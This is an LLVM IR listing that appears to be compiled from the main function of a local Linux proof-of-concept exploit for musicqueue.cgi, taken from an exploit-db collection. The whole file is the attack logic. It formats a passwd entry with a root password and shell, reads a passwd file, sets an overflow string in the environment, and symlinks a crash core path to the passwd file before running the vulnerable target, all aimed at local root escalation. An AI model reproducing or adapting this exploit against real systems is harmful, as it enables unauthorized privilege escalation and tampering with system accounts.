; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23297.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23297.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SZ_DEF_BR = common dso_local global i32 0, align 4
@DEF_LEN = common dso_local global i32 0, align 4
@DEF_ZR = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [68 x i8] c"\0A 0x82-Local.musicqueue_xpl - musicqueue.cgi v-1.2.0 POC exploit.\0A\0A\00", align 1
@TTL_FORMAT_STR = common dso_local global i8* null, align 8
@REQUEST_METHOD_MK = common dso_local global i32 0, align 4
@S_TOKEN = common dso_local global i32 0, align 4
@S_PASS = common dso_local global i32 0, align 4
@USER_UID = common dso_local global i32 0, align 4
@USER_GID = common dso_local global i32 0, align 4
@ROOT_PWD = common dso_local global i32 0, align 4
@SHELL_PATH = common dso_local global i32 0, align 4
@WRT_PASSWD_PATH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@DEF_MN = common dso_local global i32 0, align 4
@DEF_NR = common dso_local global i32 0, align 4
@S_ENV_PTE = common dso_local global i32 0, align 4
@S_ENV_PTO = common dso_local global i32 0, align 4
@STK_OVERFLOW_STR = common dso_local global i8* null, align 8
@CRASH_CORE_PATH = common dso_local global i32 0, align 4
@DEF_TG_PATH = common dso_local global i32 0, align 4
@S_ENV_PTH = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32* null, i32** %2, align 8
  %9 = load i32, i32* @SZ_DEF_BR, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %3, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %4, align 8
  %13 = load i32, i32* @DEF_LEN, align 4
  %14 = zext i32 %13 to i64
  %15 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %5, align 8
  %16 = load i32, i32* @DEF_ZR, align 4
  store i32 %16, i32* %6, align 4
  %17 = load i32, i32* @DEF_ZR, align 4
  store i32 %17, i32* %7, align 4
  %18 = load i32, i32* @stdout, align 4
  %19 = call i32 @fprintf(i32 %18, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* @DEF_ZR, align 4
  %21 = trunc i64 %10 to i32
  %22 = call i32 @memset(i8* %12, i32 %20, i32 %21)
  %23 = sub i64 %10, 1
  %24 = trunc i64 %23 to i32
  %25 = load i8*, i8** @TTL_FORMAT_STR, align 8
  %26 = load i32, i32* @REQUEST_METHOD_MK, align 4
  %27 = load i32, i32* @S_TOKEN, align 4
  %28 = load i32, i32* @S_PASS, align 4
  %29 = load i32, i32* @S_TOKEN, align 4
  %30 = load i32, i32* @USER_UID, align 4
  %31 = load i32, i32* @S_TOKEN, align 4
  %32 = load i32, i32* @USER_GID, align 4
  %33 = load i32, i32* @S_TOKEN, align 4
  %34 = load i32, i32* @S_TOKEN, align 4
  %35 = load i32, i32* @ROOT_PWD, align 4
  %36 = load i32, i32* @S_TOKEN, align 4
  %37 = load i32, i32* @SHELL_PATH, align 4
  %38 = call i32 @snprintf(i8* %12, i32 %24, i8* %25, i32 %26, i32 %27, i32 %28, i32 %29, i32 %30, i32 %31, i32 %32, i32 %33, i32 %34, i32 %35, i32 %36, i32 %37)
  %39 = load i32, i32* @WRT_PASSWD_PATH, align 4
  %40 = call i32* @fopen(i32 %39, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %40, i32** %2, align 8
  %41 = icmp eq i32* %40, null
  br i1 %41, label %42, label %44

42:                                               ; preds = %0
  %43 = load i32, i32* @DEF_MN, align 4
  store i32 %43, i32* %1, align 4
  store i32 1, i32* %8, align 4
  br label %101

44:                                               ; preds = %0
  %45 = load i32, i32* @DEF_ZR, align 4
  %46 = trunc i64 %14 to i32
  %47 = call i32 @memset(i8* %15, i32 %45, i32 %46)
  %48 = load i32, i32* @DEF_ZR, align 4
  store i32 %48, i32* %7, align 4
  br label %49

49:                                               ; preds = %61, %44
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @strlen(i8* %12)
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %64

53:                                               ; preds = %49
  %54 = load i32, i32* %7, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %12, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = load i32, i32* %7, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %15, i64 %59
  store i8 %57, i8* %60, align 1
  br label %61

61:                                               ; preds = %53
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %7, align 4
  br label %49

64:                                               ; preds = %49
  br label %65

65:                                               ; preds = %71, %64
  %66 = load i32, i32* @DEF_NR, align 4
  %67 = load i32, i32* @DEF_NR, align 4
  %68 = load i32*, i32** %2, align 8
  %69 = call i64 @fread(i32* %6, i32 %66, i32 %67, i32* %68)
  %70 = icmp ne i64 %69, 0
  br i1 %70, label %71, label %78

71:                                               ; preds = %65
  %72 = load i32, i32* %6, align 4
  %73 = trunc i32 %72 to i8
  %74 = load i32, i32* %7, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %7, align 4
  %76 = sext i32 %74 to i64
  %77 = getelementptr inbounds i8, i8* %15, i64 %76
  store i8 %73, i8* %77, align 1
  br label %65

78:                                               ; preds = %65
  %79 = load i32*, i32** %2, align 8
  %80 = call i32 @fclose(i32* %79)
  %81 = call i32 @strlen(i8* %15)
  %82 = sub nsw i32 %81, 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %15, i64 %83
  store i8 0, i8* %84, align 1
  %85 = load i32, i32* @S_ENV_PTE, align 4
  %86 = call i32 @strlen(i8* %15)
  %87 = call i32 @setenv(i32 %85, i8* %15, i32 %86)
  %88 = load i32, i32* @S_ENV_PTO, align 4
  %89 = load i8*, i8** @STK_OVERFLOW_STR, align 8
  %90 = load i8*, i8** @STK_OVERFLOW_STR, align 8
  %91 = call i32 @strlen(i8* %90)
  %92 = call i32 @setenv(i32 %88, i8* %89, i32 %91)
  %93 = load i32, i32* @CRASH_CORE_PATH, align 4
  %94 = call i32 @unlink(i32 %93)
  %95 = load i32, i32* @WRT_PASSWD_PATH, align 4
  %96 = load i32, i32* @CRASH_CORE_PATH, align 4
  %97 = call i32 @symlink(i32 %95, i32 %96)
  %98 = load i32, i32* @DEF_TG_PATH, align 4
  %99 = load i32, i32* @DEF_TG_PATH, align 4
  %100 = call i32 @execl(i32 %98, i32 %99, i32* null)
  store i32 0, i32* %8, align 4
  br label %101

101:                                              ; preds = %78, %42
  %102 = load i8*, i8** %3, align 8
  call void @llvm.stackrestore(i8* %102)
  %103 = load i32, i32* %8, align 4
  switch i32 %103, label %106 [
    i32 0, label %104
    i32 1, label %104
  ]

104:                                              ; preds = %101, %101
  %105 = load i32, i32* %1, align 4
  ret i32 %105

106:                                              ; preds = %101
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32) #2

declare dso_local i32* @fopen(i32, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @fread(i32*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @setenv(i32, i8*, i32) #2

declare dso_local i32 @unlink(i32) #2

declare dso_local i32 @symlink(i32, i32) #2

declare dso_local i32 @execl(i32, i32, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
